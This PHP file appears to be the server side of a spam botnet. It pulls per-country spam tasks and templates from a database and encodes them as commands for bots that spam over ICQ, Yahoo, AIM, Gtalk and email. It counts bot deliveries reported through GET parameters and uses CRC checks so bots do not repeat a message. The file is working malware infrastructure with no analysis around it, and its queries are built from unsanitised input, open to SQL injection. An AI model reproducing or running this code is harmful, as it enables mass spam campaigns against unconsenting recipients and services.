<?


//report_url.Format(small_report_url+"&s=%u&y=%u&i=%u&a=%u&g=%u",
//aThis->nCntSmtp,aThis->nCntYahoo,aThis->nCntIcq,aThis->nCntAim,aThis->nCntGtalk);

if(isset($_GET['i']))
inc_zu_counters($lg,$_GET['i'],@$_GET['s'],@$_GET['y'],@$_GET['g'],@$_GET['a'],@$_GET['sbt']);



echo parse_zu_message(get_zu_mesage($lg));




//Functions+++++++++++++++++++++++++++++++++++++++


function crc32_from_tmpl($tname){
	global $mres;

	$q = "SELECT * FROM `tmpl_zu` WHERE `Tname`='".$tname."'";

	$re = @mysql_query($q,$mres);
	if(!mysql_num_rows($re))
	return 0;

	$crc = 0;
	while ((@$row = mysql_fetch_object($re))){
		$crc += crc32($row->Tmessage);
	};
	
	return $crc;
};







function  parse_zu_message($str){

	$rs ='';
	
	
	if($str=='sToPsPaM')
	 return "\r\n"."#U9:"."\r\n"."#U6:"."\r\n"."#U7:"."\r\n";
	

	//if there are templates
	if(substr($str,0,2)=="#%"){
		//get ingo about templates and crc
		$tmpl = get_templates($str);

		// echo crc32_from_tmpl($tmpl['sb']);
		 //echo $tmpl['sb'];
		 
		 $tmplcrc32 = crc32_from_tmpl($tmpl['im']).crc32_from_tmpl($tmpl['mail']).crc32_from_tmpl($tmpl['sb']);
		 
		// echo '<br>'.$tmplcrc32.'-s<br>'.get_bot_inf(0,'FExecutedCrc');//.'-b inf'.$tmpl['im'].' s '.$tmpl['mail'];

		//compare crc on bot table - is there executed with  template
		if(compare_crc_executed($tmplcrc32))
		return  "\r\n".'.crc tmpl.';


		$IM = get_template_content($tmpl['im'],'im');
		$MAILP = get_template_content($tmpl['mail'],'mp');
		$MAILS = get_template_content($tmpl['mail'],'ms');
  
		$BOTSP =  get_template_content($tmpl['sb'],'sbp');
		$BOTSS = get_template_content($tmpl['sb'],'sbs');
		
		$rs = "\r\n";
		if(strlen($IM)){
		 $rs .= "#U0:"."\r\n";
			$rs .= "#U9:".$IM."\r\n";
		};
   		
		if(strlen($BOTSP))
		$rs .= "#U::".$BOTSP."\r\n";
		
		if(strlen($BOTSS))
		$rs .= "#U;:".$BOTSS."\r\n";

		
		if(strlen($MAILP))
		$rs .= "#U6:".$MAILP."\r\n";

		if(strlen($MAILS))
		$rs .= "#U7:".$MAILS."\r\n";

		
	//write crc of returned message`s on bot
	wri_bot_inf(0,'FExecutedCrc',$tmplcrc32);		
		
		//return content
		return  $rs;

	};


	if(compare_crc_executed(crc32($str)))
	return  "\r\n".'.crc s.';



	$rs .= "\r\n"."#U9:".str_replace("\r\n",'|',$str)."\r\n";
	$rs .= "\r\n"."#U6:".str_replace("\r\n",'|',$str)."\r\n";
	//for spam bots
	$rs .= "\r\n"."#U::".str_replace("\r\n",'|',$str)."\r\n";

	//write crc of returned message`s on bot
	wri_bot_inf(0,'FExecutedCrc',crc32($str));
	
	//return content
	return $rs;
};











function get_template_content($name,$type){
	global $mres;

	$q = "SELECT * FROM `tmpl_zu` WHERE `Tname`='".$name."' AND `Ttype`='".$type."'";
	$res = mysql_query($q,$mres);
	if(!mysql_num_rows($res))
	return '';

	$strret ='';
	while((@$row = mysql_fetch_object($res))){

		$strret .= str_replace("\r\n",'|',$row->Tmessage).'%%';

	};

	return $strret;

};





function get_templates($str){

	$tparr = explode('#%',$str);

	foreach ($tparr as $a){

		if(substr($a,0,2)=='im')
		$ret['im']=urldecode(substr($a,3));
		if(substr($a,0,2)=='ml')
		$ret['mail']=urldecode(substr($a,3));
		if(substr($a,0,2)=='sb')
		$ret['sb']=urldecode(substr($a,3));
		if(substr($a,0,2)=='cr')
		$ret['crc32']=urldecode(substr($a,3));

	};
	return $ret;

};





function prepare_zu_message($str){

	$str = trim(trim($str));
	if(strlen($str)==0)
	return '';

	$str = str_replace("\r\n",'|',$str);
	return "\r\n".'#U3:'.$str."\r\n";

};







function get_zu_mesage($land){
	global $mres;

	$q = "SELECT * FROM `task_zu` WHERE `Tland`='".$land."' LIMIT 1";
	$res =  @mysql_query($q,$mres);
	if(!mysql_num_rows($res)){

		// if message for dafault land is set/
		$def =  get_zu_def_message();

		if(strlen($def))
		return trim($def);

		return  '';
	}

	$row = mysql_fetch_object($res);

	if($row->Tstop)
	return 'sToPsPaM';


	return trim($row->Tmessage);
};






function  get_zu_def_message(){
	global $mres;
	$q = "SELECT * FROM `task_zu` WHERE `Tland`='DEF' LIMIT 1";
	$r  =  @mysql_query($q,$mres);
	if(!@mysql_num_rows($r))
	return '';

	$rw =mysql_fetch_object($r);
	return $rw->Tmessage;

};






//check whem is the land in task table, if not  - switch to DEF.
function present_in_task_zu($land){
	global $mres;

	$q = 'SELECT `Tland` FROM `task_zu` WHERE `Tland`="'.$land.'" LIMIT 1';

	if(@mysql_num_rows(mysql_query($q,$mres)))
	return $land;
	else
	return 'DEF';
};








function inc_zu_counters($land,$icq=0,$mail=0,$yahoo=0,$google=0,$aim=0,$spambots=0){
	global $mres;


	//check land -- is in task list or not.
	$land = present_in_task_zu($land);

	$q = "UPDATE `task_zu` SET `Tsbots_done`=`Tsbots_done`+".$spambots.", `Tgoogle_done`=`Tgoogle_done`+".$google.", `Taim_done`=`Taim_done`+".$aim.", `Ticq_done`=`Ticq_done`+".$icq.", `Tyahoo_done`=`Tyahoo_done`+".$yahoo.", `Tmail_done`=`Tmail_done`+".$mail." WHERE `Tland`='".$land."' LIMIT 1";
	
	@mysql_query($q,$mres);
	return mysql_affected_rows($mres);

};




?>